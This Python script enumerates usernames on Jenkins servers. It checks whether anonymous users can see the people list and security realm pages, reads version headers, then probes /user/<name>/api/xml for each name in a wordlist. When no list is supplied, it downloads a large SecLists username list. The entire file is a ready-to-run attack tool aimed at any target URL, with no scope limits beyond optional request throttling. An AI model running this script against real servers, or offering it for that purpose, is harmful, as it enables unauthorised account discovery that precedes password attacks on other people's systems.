import argparse
import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_args():
	parser = argparse.ArgumentParser(description='Jenkins username bruteforcing. *Internet required* or use local wordlist to do it offline')
	parser.add_argument('-w', '--website', type=str, required=True, help='Required. Jenkins website URL')
	parser.add_argument('-wp', '--webport', type=int, help='Jenkins website port (default: 8080)')
	parser.add_argument('-wl', '--wordlist', type=str, help='Wordlist containing the usernames to try (default: Seclists usernames list)')
	parser.add_argument('-ri', '--req_interval', type=int, help='Seconds to throttle each web request, useful for troubleshooting (default: 0)')
	parser.add_argument('--local_proxy', action='store_true', help="Enable local proxy (default: {'http': 'http://127.0.0.1:8080'})")
	return parser.parse_args()

def download_dict():
	# If no wordlist was specified in command line, it will download a Seclist from internet
	try:
		print ("[>] No wordlist was specified, downloading Seclist ", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
		url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames-dup.txt"
		w = requests.get(url, timeout=3)
		print ("[>] Downloading Seclists complete...")
		return w.text.splitlines()
	except:
		print("[X] Error: Can not download Seclists dictionary from internet, should set --wordlist")
		exit()

def load_dict(wordlist):
	# If wordlist was specified, it will check if this can be opened
	print (f"[>] Using wordlist {wordlist}")
	try:
		with open(wordlist, "r") as file:
			words = file.read()
		return words.splitlines()
	except:
		print ("[X] Error: Can not open specified wordlist, please check !")
		exit()

def main():
	args = parse_args()
	WEB_URL = args.website if 'http' in args.website else 'http://' + args.website
	WEB_PORT = args.webport if args.webport else 8080
	WEBSITE = str(WEB_URL) + ':' + str(WEB_PORT)
	WORDLIST = load_dict(args.wordlist) if args.wordlist else download_dict()
	REQ_TIME = args.req_interval if args.req_interval else 0
	PROXIES = {'http': 'http://127.0.0.1:8080'} if args.local_proxy else None


	try:
		r = requests.get(WEBSITE, proxies=PROXIES)
		#Checking connection to Jenkins server
		print ("[>] Connecting to Jenkins server", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
		#Server information based on response headers
		print ("[+] Server version: " + r.headers['Server'])
		print ("[+] Jenkins version: " + r.headers['X-Jenkins'])
		print ("[+] Hudson version: " + r.headers['X-Hudson'])
		print ("[ ] ...")
		if r.status_code == 200:
			s = requests.get(WEBSITE + "/asynchPeople/", proxies=PROXIES)
			if s.status_code == 200:
				print ("[+] Can Anonymous view the local user list? YES !")
				print (f"   [>] {WEBSITE}/asynchPeople/")
			elif s.status_code == 403:
				print ("[-] Can Anonymous view the local user list? NO !")
			s = requests.get(WEBSITE + "/securityRealm/", proxies=PROXIES)
			if s.status_code == 200:
				print ("[+] Can Anonymous view Jenkins own user database? YES !")
				print (f"   [>] {WEBSITE}/securityRealm/")
			elif s.status_code == 403:
				print ("[-] Can Anonymous view Jenkins own user database? NO !")
			elif s.status_code == 404:
				print ("[-] Can Anonymous view Jenkins own user database? NO !")
				print ("   [X] Local authentication disabled")
			print("[>] Initializing usernames bruteforcing ", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
	except:
		print ("[-] Error: Can not connect to Jenkins server. Check URL and port.")
		exit()


	start_time = time.time()
	requests_count = 0

	for index, user in enumerate(WORDLIST, start=1):
		try:
			time.sleep(REQ_TIME)
			user_url = WEBSITE + "/user/" + user + "/api/xml"
			t = requests.get(user_url, proxies=PROXIES)
			requests_count += 1
			if t.status_code == 200:
				print (f"[+] Valid username found at index {index} : {user}")
				print (f"   [>] {user_url}")
			
			percentage = round((index*100) / len(WORDLIST),2)
			#Prints a message each time a multiple of 10000 is reached or when reaching user #10000
			if index % 10000 == 0 or index == 10000:
				elapsed_time = time.time() - start_time
				rps = requests_count / elapsed_time
				print (f"[>] Checking {index}/{len(WORDLIST)} ({percentage}%) of total users... | RPS: {rps:.2f}")

			if percentage == 100:
				print ("[+] Bruteforcing complete! All usernames in wordlist were checked...")
		except KeyboardInterrupt:
			print (f"[X] Bruteforcing exited by user! {index} usernames in wordlist were checked...")
			exit()
		except:
			print ("[X] Error: Something went wrong. Check with --local_proxy and --req_interval 5")
			exit()		


if __name__ == "__main__":
	main()